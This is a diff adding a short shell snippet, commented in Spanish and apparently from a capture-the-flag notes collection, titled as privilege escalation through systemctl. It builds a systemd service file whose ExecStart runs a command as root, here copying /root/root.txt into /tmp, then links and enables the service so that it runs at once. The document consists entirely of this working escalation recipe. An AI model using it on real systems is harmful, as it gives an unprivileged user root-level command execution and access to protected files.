@@ -1,0 +1,15 @@
+--------------------------------
+# Escalada de privilegios con SystemCtl
+
+# Creamos una variable de entorno.
+# Esta variable será el nombre del servicio.
+privesc=$(mktemp).service
+# Creamos un archivo de unit y lo asignamos a la varible.
+# En ExecStart escribimos el comando que deseemos que el root haga.
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flageada"
+[Install]
+WantedBy=multi-user.target' > $privesc
+systemctl link $privesc
+systemctl enable --now $privesc
